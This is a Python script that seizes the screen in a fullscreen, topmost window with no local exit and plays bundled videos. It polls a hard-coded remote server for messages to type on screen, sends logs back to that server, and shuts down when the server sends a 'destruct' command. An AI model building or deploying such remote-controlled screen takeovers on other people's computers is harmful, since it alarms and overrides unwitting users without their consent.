import tkinter as tk
import time
import cv2
from PIL import Image, ImageTk
import threading
import requests
import os
import sys

url = "https://ms32-sha2.onrender.com/"
user = "<APP>"
terminate = False
say_msg = ""
message_label = None

def hit(url: str, data=None):
    if not terminate:
        try:
            if data:
                return requests.post(url, json=data)
            return requests.get(url, stream=True)
        except:
            return "none"

def log(statement, state="SUCESS", terminal=False):
    try:
        statement = f"{state}   {statement}"
        if terminal:
            hit(url + "terminal", data={"output": statement})
        hit(url + "output", data={"user": user, "err": statement})
    except:
        pass

def get_video_path(video_name):
    if getattr(sys, 'frozen', False):
        return os.path.join(sys._MEIPASS, video_name)
    return os.path.join(os.path.dirname(__file__), video_name)

root = tk.Tk()
root.configure(bg="blue")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

def resize_frame(frame, width, height):
    h, w = frame.shape[:2]
    aspect = w / h
    if aspect > 1:
        new_w = width
        new_h = int(width / aspect)
    else:
        new_h = height
        new_w = int(height * aspect)
    return cv2.resize(frame, (new_w, new_h))

def play_video(path, callback=None):
    try:
        cap = cv2.VideoCapture(path)
        if not cap.isOpened():
            raise ValueError("Could not open video file.")

        canvas = tk.Canvas(root, width=root.winfo_width(), height=root.winfo_height(), bg="black")
        canvas.pack()

        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_resized = resize_frame(frame, root.winfo_width(), root.winfo_height())
            frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)
            img = ImageTk.PhotoImage(image=Image.fromarray(frame_rgb))
            canvas.create_image(0, 0, anchor=tk.NW, image=img)
            canvas.image = img
            root.update()
        cap.release()
        canvas.destroy()
        if callback:
            callback()
    except Exception as e:
        log(f"Error playing video: {e}", "FATAL", terminal=True)

def format_message(text, limit=22):
    words = text.split()
    lines, line = [], ""
    for word in words:
        if len(line + word) <= limit:
            line += word + " "
        else:
            lines.append(line.strip())
            line = word + " "
    if line:
        lines.append(line.strip())
    return "\n".join(lines)

def type_message(msg, label, speed=0.07):
    formatted = format_message(msg)
    def animate():
        current = ""
        for ch in formatted:
            current += ch
            label.config(text=current + "_")
            root.update()
            time.sleep(speed)
        blink_cursor(label, current)
        log(f"Displayed message: {msg}")
    threading.Thread(target=animate, daemon=True).start()

def blink_cursor(label, message):
    for _ in range(6):
        label.config(text=message + "_")
        root.update()
        time.sleep(0.5)
        label.config(text=message)
        root.update()
        time.sleep(0.5)
    if message.strip() == "dEsTrUcT":
        close_window()

def clear_screen_with_backspace():
    global message_label
    try:
        text = message_label.cget("text")
        if len(text.replace("\n", "")) > 18:
            message_label.config(text="")
            return
        for _ in range(len(text)):
            text = text[:-1]
            message_label.config(text=text + "_")
            root.update()
            time.sleep(0.05)
    except Exception as e:
        log(f"Backspace error: {e}", "WARN")

def create_message_label():
    global message_label
    message_label = tk.Label(root, text="", font=("Courier", 28, "bold"), bg="blue", fg="white")
    message_label.pack(expand=True)

def get_message_from_url():
    try:
        res = requests.get(url + "get-com", timeout=5)
        res.raise_for_status()
        return res.text.strip()
    except:
        return None

def check_for_new_message():
    global say_msg
    try:
        new_msg = get_message_from_url()
        if new_msg == "dEsTrUcT":
            close_window()
            return
        if new_msg and new_msg != say_msg and new_msg != "none":
            say_msg = new_msg
            clear_screen_with_backspace()
            type_message(say_msg, message_label)
    except Exception as e:
        log(f"Error checking message: {e}", "WARN")
    finally:
        root.after(5000, check_for_new_message)

def close_window():
    threading.Thread(target=clean_exit_sequence).start()

def clean_exit_sequence():
    global message_label
    try:
        if message_label:
            clear_screen_with_backspace()
            message_label.destroy()
            message_label = None
        log("Message cleared before destruction.", "SUCESS")
        time.sleep(0.5)
        play_video(get_video_path("your_video_reverse.mp4"), root.destroy)
    except Exception as e:
        log(f"Error cleaning up: {e}", "FATAL", terminal=True)
        root.destroy()

def show_black_screen():
    root.configure(bg="black")
    root.update()
    time.sleep(1)
    root.configure(bg="blue")
    root.update()
    create_message_label()
    play_video(get_video_path("your_video.mp4"))

root.after(0, show_black_screen)
root.after(1000, check_for_new_message)
root.mainloop()
